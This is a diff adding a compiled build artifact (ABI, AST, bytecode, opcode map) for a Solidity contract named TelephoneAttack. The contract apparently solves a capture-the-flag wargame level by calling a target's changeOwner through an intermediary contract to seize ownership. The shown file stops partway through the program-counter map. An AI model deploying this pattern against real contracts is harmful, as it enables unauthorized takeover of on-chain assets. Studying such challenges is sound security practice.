@@ -1,0 +1,2065 @@
+{
+  "abi": [
+    {
+      "inputs": [
+        {
+          "internalType": "address",
+          "name": "_challengeAddress",
+          "type": "address"
+        }
+      ],
+      "stateMutability": "nonpayable",
+      "type": "constructor"
+    },
+    {
+      "inputs": [
+        {
+          "internalType": "address",
+          "name": "_owner",
+          "type": "address"
+        }
+      ],
+      "name": "attack",
+      "outputs": [],
+      "stateMutability": "nonpayable",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "challenge",
+      "outputs": [
+        {
+          "internalType": "contract ITelephone",
+          "name": "",
+          "type": "address"
+        }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    }
+  ],
+  "allSourcePaths": {
+    "8": "contracts/04_Telephone/TelephoneAttack.sol"
+  },
+  "ast": {
+    "absolutePath": "contracts/04_Telephone/TelephoneAttack.sol",
+    "exportedSymbols": {
+      "ITelephone": [
+        192
+      ],
+      "TelephoneAttack": [
+        219
+      ]
+    },
+    "id": 220,
+    "license": "MIT",
+    "nodeType": "SourceUnit",
+    "nodes": [
+      {
+        "id": 186,
+        "literals": [
+          "solidity",
+          "^",
+          "0.6",
+          ".0"
+        ],
+        "nodeType": "PragmaDirective",
+        "src": "32:23:8"
+      },
+      {
+        "abstract": false,
+        "baseContracts": [],
+        "contractDependencies": [],
+        "contractKind": "interface",
+        "documentation": null,
+        "fullyImplemented": false,
+        "id": 192,
+        "linearizedBaseContracts": [
+          192
+        ],
+        "name": "ITelephone",
+        "nodeType": "ContractDefinition",
+        "nodes": [
+          {
+            "body": null,
+            "documentation": null,
+            "functionSelector": "a6f9dae1",
+            "id": 191,
+            "implemented": false,
+            "kind": "function",
+            "modifiers": [],
+            "name": "changeOwner",
+            "nodeType": "FunctionDefinition",
+            "overrides": null,
+            "parameters": {
+              "id": 189,
+              "nodeType": "ParameterList",
+              "parameters": [
+                {
+                  "constant": false,
+                  "id": 188,
+                  "mutability": "mutable",
+                  "name": "__owner",
+                  "nodeType": "VariableDeclaration",
+                  "overrides": null,
+                  "scope": 191,
+                  "src": "105:15:8",
+                  "stateVariable": false,
+                  "storageLocation": "default",
+                  "typeDescriptions": {
+                    "typeIdentifier": "t_address",
+                    "typeString": "address"
+                  },
+                  "typeName": {
+                    "id": 187,
+                    "name": "address",
+                    "nodeType": "ElementaryTypeName",
+                    "src": "105:7:8",
+                    "stateMutability": "nonpayable",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_address",
+                      "typeString": "address"
+                    }
+                  },
+                  "value": null,
+                  "visibility": "internal"
+                }
+              ],
+              "src": "104:17:8"
+            },
+            "returnParameters": {
+              "id": 190,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "130:0:8"
+            },
+            "scope": 192,
+            "src": "84:47:8",
+            "stateMutability": "nonpayable",
+            "virtual": false,
+            "visibility": "external"
+          }
+        ],
+        "scope": 220,
+        "src": "57:76:8"
+      },
+      {
+        "abstract": false,
+        "baseContracts": [],
+        "contractDependencies": [],
+        "contractKind": "contract",
+        "documentation": null,
+        "fullyImplemented": true,
+        "id": 219,
+        "linearizedBaseContracts": [
+          219
+        ],
+        "name": "TelephoneAttack",
+        "nodeType": "ContractDefinition",
+        "nodes": [
+          {
+            "constant": false,
+            "functionSelector": "d2ef7398",
+            "id": 194,
+            "mutability": "mutable",
+            "name": "challenge",
+            "nodeType": "VariableDeclaration",
+            "overrides": null,
+            "scope": 219,
+            "src": "166:27:8",
+            "stateVariable": true,
+            "storageLocation": "default",
+            "typeDescriptions": {
+              "typeIdentifier": "t_contract$_ITelephone_$192",
+              "typeString": "contract ITelephone"
+            },
+            "typeName": {
+              "contractScope": null,
+              "id": 193,
+              "name": "ITelephone",
+              "nodeType": "UserDefinedTypeName",
+              "referencedDeclaration": 192,
+              "src": "166:10:8",
+              "typeDescriptions": {
+                "typeIdentifier": "t_contract$_ITelephone_$192",
+                "typeString": "contract ITelephone"
+              }
+            },
+            "value": null,
+            "visibility": "public"
+          },
+          {
+            "body": {
+              "id": 205,
+              "nodeType": "Block",
+              "src": "246:58:8",
+              "statements": [
+                {
+                  "expression": {
+                    "argumentTypes": null,
+                    "id": 203,
+                    "isConstant": false,
+                    "isLValue": false,
+                    "isPure": false,
+                    "lValueRequested": false,
+                    "leftHandSide": {
+                      "argumentTypes": null,
+                      "id": 199,
+                      "name": "challenge",
+                      "nodeType": "Identifier",
+                      "overloadedDeclarations": [],
+                      "referencedDeclaration": 194,
+                      "src": "256:9:8",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_contract$_ITelephone_$192",
+                        "typeString": "contract ITelephone"
+                      }
+                    },
+                    "nodeType": "Assignment",
+                    "operator": "=",
+                    "rightHandSide": {
+                      "argumentTypes": null,
+                      "arguments": [
+                        {
+                          "argumentTypes": null,
+                          "id": 201,
+                          "name": "_challengeAddress",
+                          "nodeType": "Identifier",
+                          "overloadedDeclarations": [],
+                          "referencedDeclaration": 196,
+                          "src": "279:17:8",
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_address",
+                            "typeString": "address"
+                          }
+                        }
+                      ],
+                      "expression": {
+                        "argumentTypes": [
+                          {
+                            "typeIdentifier": "t_address",
+                            "typeString": "address"
+                          }
+                        ],
+                        "id": 200,
+                        "name": "ITelephone",
+                        "nodeType": "Identifier",
+                        "overloadedDeclarations": [],
+                        "referencedDeclaration": 192,
+                        "src": "268:10:8",
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_type$_t_contract$_ITelephone_$192_$",
+                          "typeString": "type(contract ITelephone)"
+                        }
+                      },
+                      "id": 202,
+                      "isConstant": false,
+                      "isLValue": false,
+                      "isPure": false,
+                      "kind": "typeConversion",
+                      "lValueRequested": false,
+                      "names": [],
+                      "nodeType": "FunctionCall",
+                      "src": "268:29:8",
+                      "tryCall": false,
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_contract$_ITelephone_$192",
+                        "typeString": "contract ITelephone"
+                      }
+                    },
+                    "src": "256:41:8",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_contract$_ITelephone_$192",
+                      "typeString": "contract ITelephone"
+                    }
+                  },
+                  "id": 204,
+                  "nodeType": "ExpressionStatement",
+                  "src": "256:41:8"
+                }
+              ]
+            },
+            "documentation": null,
+            "id": 206,
+            "implemented": true,
+            "kind": "constructor",
+            "modifiers": [],
+            "name": "",
+            "nodeType": "FunctionDefinition",
+            "overrides": null,
+            "parameters": {
+              "id": 197,
+              "nodeType": "ParameterList",
+              "parameters": [
+                {
+                  "constant": false,
+                  "id": 196,
+                  "mutability": "mutable",
+                  "name": "_challengeAddress",
+                  "nodeType": "VariableDeclaration",
+                  "overrides": null,
+                  "scope": 206,
+                  "src": "212:25:8",
+                  "stateVariable": false,
+                  "storageLocation": "default",
+                  "typeDescriptions": {
+                    "typeIdentifier": "t_address",
+                    "typeString": "address"
+                  },
+                  "typeName": {
+                    "id": 195,
+                    "name": "address",
+                    "nodeType": "ElementaryTypeName",
+                    "src": "212:7:8",
+                    "stateMutability": "nonpayable",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_address",
+                      "typeString": "address"
+                    }
+                  },
+                  "value": null,
+                  "visibility": "internal"
+                }
+              ],
+              "src": "211:27:8"
+            },
+            "returnParameters": {
+              "id": 198,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "246:0:8"
+            },
+            "scope": 219,
+            "src": "200:104:8",
+            "stateMutability": "nonpayable",
+            "virtual": false,
+            "visibility": "public"
+          },
+          {
+            "body": {
+              "id": 217,
+              "nodeType": "Block",
+              "src": "349:46:8",
+              "statements": [
+                {
+                  "expression": {
+                    "argumentTypes": null,
+                    "arguments": [
+                      {
+                        "argumentTypes": null,
+                        "id": 214,
+                        "name": "_owner",
+                        "nodeType": "Identifier",
+                        "overloadedDeclarations": [],
+                        "referencedDeclaration": 208,
+                        "src": "381:6:8",
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_address",
+                          "typeString": "address"
+                        }
+                      }
+                    ],
+                    "expression": {
+                      "argumentTypes": [
+                        {
+                          "typeIdentifier": "t_address",
+                          "typeString": "address"
+                        }
+                      ],
+                      "expression": {
+                        "argumentTypes": null,
+                        "id": 211,
+                        "name": "challenge",
+                        "nodeType": "Identifier",
+                        "overloadedDeclarations": [],
+                        "referencedDeclaration": 194,
+                        "src": "359:9:8",
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_contract$_ITelephone_$192",
+                          "typeString": "contract ITelephone"
+                        }
+                      },
+                      "id": 213,
+                      "isConstant": false,
+                      "isLValue": false,
+                      "isPure": false,
+                      "lValueRequested": false,
+                      "memberName": "changeOwner",
+                      "nodeType": "MemberAccess",
+                      "referencedDeclaration": 191,
+                      "src": "359:21:8",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_function_external_nonpayable$_t_address_$returns$__$",
+                        "typeString": "function (address) external"
+                      }
+                    },
+                    "id": 215,
+                    "isConstant": false,
+                    "isLValue": false,
+                    "isPure": false,
+                    "kind": "functionCall",
+                    "lValueRequested": false,
+                    "names": [],
+                    "nodeType": "FunctionCall",
+                    "src": "359:29:8",
+                    "tryCall": false,
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_tuple$__$",
+                      "typeString": "tuple()"
+                    }
+                  },
+                  "id": 216,
+                  "nodeType": "ExpressionStatement",
+                  "src": "359:29:8"
+                }
+              ]
+            },
+            "documentation": null,
+            "functionSelector": "d018db3e",
+            "id": 218,
+            "implemented": true,
+            "kind": "function",
+            "modifiers": [],
+            "name": "attack",
+            "nodeType": "FunctionDefinition",
+            "overrides": null,
+            "parameters": {
+              "id": 209,
+              "nodeType": "ParameterList",
+              "parameters": [
+                {
+                  "constant": false,
+                  "id": 208,
+                  "mutability": "mutable",
+                  "name": "_owner",
+                  "nodeType": "VariableDeclaration",
+                  "overrides": null,
+                  "scope": 218,
+                  "src": "326:14:8",
+                  "stateVariable": false,
+                  "storageLocation": "default",
+                  "typeDescriptions": {
+                    "typeIdentifier": "t_address",
+                    "typeString": "address"
+                  },
+                  "typeName": {
+                    "id": 207,
+                    "name": "address",
+                    "nodeType": "ElementaryTypeName",
+                    "src": "326:7:8",
+                    "stateMutability": "nonpayable",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_address",
+                      "typeString": "address"
+                    }
+                  },
+                  "value": null,
+                  "visibility": "internal"
+                }
+              ],
+              "src": "325:16:8"
+            },
+            "returnParameters": {
+              "id": 210,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "349:0:8"
+            },
+            "scope": 219,
+            "src": "310:85:8",
+            "stateMutability": "nonpayable",
+            "virtual": false,
+            "visibility": "public"
+          }
+        ],
+        "scope": 220,
+        "src": "135:262:8"
+      }
+    ],
+    "src": "32:365:8"
+  },
+  "bytecode": "608060405234801561001057600080fd5b5060405161018c38038061018c8339818101604052602081101561003357600080fd5b5051600080546001600160a01b039092166001600160a01b0319909216919091179055610127806100656000396000f3fe6080604052348015600f57600080fd5b506004361060325760003560e01c8063d018db3e146037578063d2ef739814605c575b600080fd5b605a60048036036020811015604b57600080fd5b50356001600160a01b0316607e565b005b606260e2565b604080516001600160a01b039092168252519081900360200190f35b600080546040805163a6f9dae160e01b81526001600160a01b0385811660048301529151919092169263a6f9dae1926024808201939182900301818387803b15801560c857600080fd5b505af115801560db573d6000803e3d6000fd5b5050505050565b6000546001600160a01b03168156fea2646970667358221220c12de45adceaefc58dc919385e8946c0097699a4b50ab6077afa2fb536852eed64736f6c634300060c0033",
+  "bytecodeSha1": "f6db190bf93b8dbcee373d40c2fe5b6cc81d3260",
+  "compiler": {
+    "evm_version": "istanbul",
+    "optimizer": {
+      "enabled": true,
+      "runs": 200
+    },
+    "version": "0.6.12+commit.27d51765"
+  },
+  "contractName": "TelephoneAttack",
+  "coverageMap": {
+    "branches": {
+      "8": {}
+    },
+    "statements": {
+      "8": {
+        "TelephoneAttack.attack": {
+          "0": [
+            359,
+            388
+          ]
+        }
+      }
+    }
+  },
+  "dependencies": [
+    "ITelephone"
+  ],
+  "deployedBytecode": "6080604052348015600f57600080fd5b506004361060325760003560e01c8063d018db3e146037578063d2ef739814605c575b600080fd5b605a60048036036020811015604b57600080fd5b50356001600160a01b0316607e565b005b606260e2565b604080516001600160a01b039092168252519081900360200190f35b600080546040805163a6f9dae160e01b81526001600160a01b0385811660048301529151919092169263a6f9dae1926024808201939182900301818387803b15801560c857600080fd5b505af115801560db573d6000803e3d6000fd5b5050505050565b6000546001600160a01b03168156fea2646970667358221220c12de45adceaefc58dc919385e8946c0097699a4b50ab6077afa2fb536852eed64736f6c634300060c0033",
+  "deployedSourceMap": "135:262:8:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;310:85;;;;;;;;;;;;;;;;-1:-1:-1;310:85:8;-1:-1:-1;;;;;310:85:8;;:::i;:::-;;166:27;;;:::i;:::-;;;;-1:-1:-1;;;;;166:27:8;;;;;;;;;;;;;;310:85;359:9;;;:29;;;-1:-1:-1;;;359:29:8;;-1:-1:-1;;;;;359:29:8;;;;;;;;;:9;;;;;:21;;:29;;;;;;;;;;;:9;;:29;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;310:85;:::o;166:27::-;;;-1:-1:-1;;;;;166:27:8;;:::o",
+  "language": "Solidity",
+  "natspec": {
+    "kind": "dev",
+    "methods": {},
+    "version": 1
+  },
+  "offset": [
+    135,
+    397
+  ],
+  "opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH1 0x32 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xD018DB3E EQ PUSH1 0x37 JUMPI DUP1 PUSH4 0xD2EF7398 EQ PUSH1 0x5C JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x5A PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH1 0x4B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH1 0x7E JUMP JUMPDEST STOP JUMPDEST PUSH1 0x62 PUSH1 0xE2 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0xA6F9DAE1 PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 DUP2 AND PUSH1 0x4 DUP4 ADD MSTORE SWAP2 MLOAD SWAP2 SWAP1 SWAP3 AND SWAP3 PUSH4 0xA6F9DAE1 SWAP3 PUSH1 0x24 DUP1 DUP3 ADD SWAP4 SWAP2 DUP3 SWAP1 SUB ADD DUP2 DUP4 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH1 0xC8 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH1 0xDB JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xC1 0x2D 0xE4 GAS 0xDC 0xEA 0xEF 0xC5 DUP14 0xC9 NOT CODESIZE 0x5E DUP10 CHAINID 0xC0 MULMOD PUSH23 0x99A4B50AB6077AFA2FB536852EED64736F6C634300060C STOP CALLER ",
+  "pcMap": {
+    "0": {
+      "offset": [
+        135,
+        397
+      ],
+      "op": "PUSH1",
+      "path": "8",
+      "value": "0x80"
+    },
+    "2": {
+      "fn": null,
+      "offset": [
+        135,
+        397
+      ],
+      "op": "PUSH1",
+      "path": "8",
+      "value": "0x40"
+    },
+    "4": {
+      "fn": null,
+      "offset": [
+        135,
+        397
+      ],
+      "op": "MSTORE",
+      "path": "8"
+    },
+    "5": {
+      "fn": null,
+      "offset": [
+        135,
+        397
+      ],
+      "op": "CALLVALUE",
+      "path": "8"
+    },
+    "6": {
+      "fn": null,
+      "offset": [
+        135,
+        397
+      ],
+      "op": "DUP1",
+      "path": "8"
+    },
+    "7": {
+      "fn": null,
+      "offset": [
+        135,
+        397
+      ],
+      "op": "ISZERO",
+      "path": "8"
+    },
+    "8": {
+      "fn": null,
+      "offset": [
+        135,
+        397
+      ],
+      "op": "PUSH1",
+      "path": "8",
+      "value": "0xF"
+    },
+    "10": {
+      "fn": null,
+      "offset": [
+        135,
+        397
+      ],
+      "op": "JUMPI",
+      "path": "8"
+    },
+    "11": {
+      "fn": null,
+      "offset": [
+        135,
+        397
+      ],
+      "op": "PUSH1",
+      "path": "8",
+      "value": "0x0"
+    },
+    "13": {
+      "fn": null,
+      "offset": [
+        135,
+        397
+      ],
+      "op": "DUP1",
+      "path": "8"
+    },
+    "14": {
+      "dev": "Cannot send ether to nonpayable function",
+      "fn": null,
+      "offset": [
+        135,
+        397
+      ],
+      "op": "REVERT",
+      "path": "8"
+    },
+    "15": {
+      "fn": null,
+      "offset": [
+        135,
+        397
+      ],
+      "op": "JUMPDEST",
+      "path": "8"
+    },
+    "16": {
+      "fn": null,
+      "offset": [
+        135,
+        397
+      ],
+      "op": "POP",
+      "path": "8"
+    },
+    "17": {
+      "fn": null,
+      "offset": [
+        135,
+        397
+      ],
+      "op": "PUSH1",
+      "path": "8",
+      "value": "0x4"
+    },
+    "19": {
+      "fn": null,
+      "offset": [
+        135,
+        397
+      ],
+      "op": "CALLDATASIZE",
+      "path": "8"
+    },
+    "20": {
+      "fn": null,
+      "offset": [
+        135,
+        397
+      ],
+      "op": "LT",
+      "path": "8"
+    },
+    "21": {
+      "fn": null,
+      "offset": [
+        135,
+        397
+      ],
+      "op": "PUSH1",
+      "path": "8",
+      "value": "0x32"
+    },
+    "23": {
+      "fn": null,
+      "offset": [
+        135,
+        397
+      ],
+      "op": "JUMPI",
+      "path": "8"
+    },
+    "24": {
+      "fn": null,
+      "offset": [
+        135,
+        397
+      ],
+      "op": "PUSH1",
+      "path": "8",
+      "value": "0x0"
+    },
+    "26": {
+      "fn": null,
+      "offset": [
+        135,
+        397
+      ],
+      "op": "CALLDATALOAD",
+      "path": "8"
+    },
+    "27": {
+      "fn": null,
+      "offset": [
+        135,
+        397
+      ],
+      "op": "PUSH1",
+      "path": "8",
+      "value": "0xE0"
+    },
+    "29": {
+      "fn": null,
+      "offset": [
+        135,
+        397
+      ],
+      "op": "SHR",
+      "path": "8"
+    },
+    "30": {
+      "fn": null,
+      "offset": [
+        135,
+        397
+      ],
+      "op": "DUP1",
+      "path": "8"
+    },
+    "31": {
+      "fn": null,
+      "offset": [
+        135,
+        397
+      ],
+      "op": "PUSH4",
+      "path": "8",
+      "value": "0xD018DB3E"
+    },
+    "36": {
+      "fn": null,
+      "offset": [
+        135,
+        397
+      ],
+      "op": "EQ",
+      "path": "8"
+    },
+    "37": {
+      "fn": null,
+      "offset": [
+        135,
+        397
+      ],
+      "op": "PUSH1",
+      "path": "8",
+      "value": "0x37"
+    },
+    "39": {
+      "fn": null,
+      "offset": [
+        135,
+        397
+      ],
+      "op": "JUMPI",
+      "path": "8"
+    },
+    "40": {
+      "fn": null,
+      "offset": [
+        135,
+        397
+      ],
+      "op": "DUP1",
+      "path": "8"
+    },
+    "41": {
+      "fn": null,
+      "offset": [
+        135,
+        397
+      ],
+      "op": "PUSH4",
+      "path": "8",
+      "value": "0xD2EF7398"
+    },
+    "46": {
+      "fn": null,
+      "offset": [
+        135,
+        397
+      ],
+      "op": "EQ",
+      "path": "8"
+    },
+    "47": {
+      "fn": null,
+      "offset": [
+        135,
+        397
+      ],
+      "op": "PUSH1",
+      "path": "8",
+      "value": "0x5C"
+    },
+    "49": {
+      "fn": null,
+      "offset": [
+        135,
+        397
+      ],
+      "op": "JUMPI",
+      "path": "8"
+    },
+    "50": {
+      "fn": null,
+      "offset": [
+        135,
+        397
+      ],
+      "op": "JUMPDEST",
+      "path": "8"
+    },
+    "51": {
+      "fn": null,
+      "offset": [
+        135,
+        397
+      ],
+      "op": "PUSH1",
+      "path": "8",
+      "value": "0x0"
+    },
+    "53": {
+      "fn": null,
+      "offset": [
+        135,
+        397
+      ],
+      "op": "DUP1",
+      "path": "8"
+    },
+    "54": {
+      "first_revert": true,
+      "fn": null,
+      "offset": [
+        135,
+        397
+      ],
+      "op": "REVERT",
+      "path": "8"
+    },
+    "55": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        310,
+        395
+      ],
+      "op": "JUMPDEST",
+      "path": "8"
+    },
+    "56": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        310,
+        395
+      ],
+      "op": "PUSH1",
+      "path": "8",
+      "value": "0x5A"
+    },
+    "58": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        310,
+        395
+      ],
+      "op": "PUSH1",
+      "path": "8",
+      "value": "0x4"
+    },
+    "60": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        310,
+        395
+      ],
+      "op": "DUP1",
+      "path": "8"
+    },
+    "61": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        310,
+        395
+      ],
+      "op": "CALLDATASIZE",
+      "path": "8"
+    },
+    "62": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        310,
+        395
+      ],
+      "op": "SUB",
+      "path": "8"
+    },
+    "63": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        310,
+        395
+      ],
+      "op": "PUSH1",
+      "path": "8",
+      "value": "0x20"
+    },
+    "65": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        310,
+        395
+      ],
+      "op": "DUP2",
+      "path": "8"
+    },
+    "66": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        310,
+        395
+      ],
+      "op": "LT",
+      "path": "8"
+    },
+    "67": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        310,
+        395
+      ],
+      "op": "ISZERO",
+      "path": "8"
+    },
+    "68": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        310,
+        395
+      ],
+      "op": "PUSH1",
+      "path": "8",
+      "value": "0x4B"
+    },
+    "70": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        310,
+        395
+      ],
+      "op": "JUMPI",
+      "path": "8"
+    },
+    "71": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        310,
+        395
+      ],
+      "op": "PUSH1",
+      "path": "8",
+      "value": "0x0"
+    },
+    "73": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        310,
+        395
+      ],
+      "op": "DUP1",
+      "path": "8"
+    },
+    "74": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        310,
+        395
+      ],
+      "op": "REVERT",
+      "path": "8"
+    },
+    "75": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        310,
+        395
+      ],
+      "op": "JUMPDEST",
+      "path": "8"
+    },
+    "76": {
+      "op": "POP"
+    },
+    "77": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        310,
+        395
+      ],
+      "op": "CALLDATALOAD",
+      "path": "8"
+    },
+    "78": {
+      "op": "PUSH1",
+      "value": "0x1"
+    },
+    "80": {
+      "op": "PUSH1",
+      "value": "0x1"
+    },
+    "82": {
+      "op": "PUSH1",
+      "value": "0xA0"
+    },
+    "84": {
+      "op": "SHL"
+    },
+    "85": {
+      "op": "SUB"
+    },
+    "86": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        310,
+        395
+      ],
+      "op": "AND",
+      "path": "8"
+    },
+    "87": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        310,
+        395
+      ],
+      "op": "PUSH1",
+      "path": "8",
+      "value": "0x7E"
+    },
+    "89": {
+      "fn": "TelephoneAttack.attack",
+      "jump": "i",
+      "offset": [
+        310,
+        395
+      ],
+      "op": "JUMP",
+      "path": "8"
+    },
+    "90": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        310,
+        395
+      ],
+      "op": "JUMPDEST",
+      "path": "8"
+    },
+    "91": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        310,
+        395
+      ],
+      "op": "STOP",
+      "path": "8"
+    },
+    "92": {
+      "offset": [
+        166,
+        193
+      ],
+      "op": "JUMPDEST",
+      "path": "8"
+    },
+    "93": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        166,
+        193
+      ],
+      "op": "PUSH1",
+      "path": "8",
+      "value": "0x62"
+    },
+    "95": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        166,
+        193
+      ],
+      "op": "PUSH1",
+      "path": "8",
+      "value": "0xE2"
+    },
+    "97": {
+      "fn": "TelephoneAttack.attack",
+      "jump": "i",
+      "offset": [
+        166,
+        193
+      ],
+      "op": "JUMP",
+      "path": "8"
+    },
+    "98": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        166,
+        193
+      ],
+      "op": "JUMPDEST",
+      "path": "8"
+    },
+    "99": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        166,
+        193
+      ],
+      "op": "PUSH1",
+      "path": "8",
+      "value": "0x40"
+    },
+    "101": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        166,
+        193
+      ],
+      "op": "DUP1",
+      "path": "8"
+    },
+    "102": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        166,
+        193
+      ],
+      "op": "MLOAD",
+      "path": "8"
+    },
+    "103": {
+      "op": "PUSH1",
+      "value": "0x1"
+    },
+    "105": {
+      "op": "PUSH1",
+      "value": "0x1"
+    },
+    "107": {
+      "op": "PUSH1",
+      "value": "0xA0"
+    },
+    "109": {
+      "op": "SHL"
+    },
+    "110": {
+      "op": "SUB"
+    },
+    "111": {
+      "offset": [
+        166,
+        193
+      ],
+      "op": "SWAP1",
+      "path": "8"
+    },
+    "112": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        166,
+        193
+      ],
+      "op": "SWAP3",
+      "path": "8"
+    },
+    "113": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        166,
+        193
+      ],
+      "op": "AND",
+      "path": "8"
+    },
+    "114": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        166,
+        193
+      ],
+      "op": "DUP3",
+      "path": "8"
+    },
+    "115": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        166,
+        193
+      ],
+      "op": "MSTORE",
+      "path": "8"
+    },
+    "116": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        166,
+        193
+      ],
+      "op": "MLOAD",
+      "path": "8"
+    },
+    "117": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        166,
+        193
+      ],
+      "op": "SWAP1",
+      "path": "8"
+    },
+    "118": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        166,
+        193
+      ],
+      "op": "DUP2",
+      "path": "8"
+    },
+    "119": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        166,
+        193
+      ],
+      "op": "SWAP1",
+      "path": "8"
+    },
+    "120": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        166,
+        193
+      ],
+      "op": "SUB",
+      "path": "8"
+    },
+    "121": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        166,
+        193
+      ],
+      "op": "PUSH1",
+      "path": "8",
+      "value": "0x20"
+    },
+    "123": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        166,
+        193
+      ],
+      "op": "ADD",
+      "path": "8"
+    },
+    "124": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        166,
+        193
+      ],
+      "op": "SWAP1",
+      "path": "8"
+    },
+    "125": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        166,
+        193
+      ],
+      "op": "RETURN",
+      "path": "8"
+    },
+    "126": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        310,
+        395
+      ],
+      "op": "JUMPDEST",
+      "path": "8"
+    },
+    "127": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        368
+      ],
+      "op": "PUSH1",
+      "path": "8",
+      "statement": 0,
+      "value": "0x0"
+    },
+    "129": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        368
+      ],
+      "op": "DUP1",
+      "path": "8"
+    },
+    "130": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        368
+      ],
+      "op": "SLOAD",
+      "path": "8"
+    },
+    "131": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        388
+      ],
+      "op": "PUSH1",
+      "path": "8",
+      "value": "0x40"
+    },
+    "133": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        388
+      ],
+      "op": "DUP1",
+      "path": "8"
+    },
+    "134": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        388
+      ],
+      "op": "MLOAD",
+      "path": "8"
+    },
+    "135": {
+      "op": "PUSH4",
+      "value": "0xA6F9DAE1"
+    },
+    "140": {
+      "op": "PUSH1",
+      "value": "0xE0"
+    },
+    "142": {
+      "op": "SHL"
+    },
+    "143": {
+      "fn": "TelephoneAttack.attack",
+      "offset": [
+        359,
+        388
+      ],
+      "op": "DUP2",
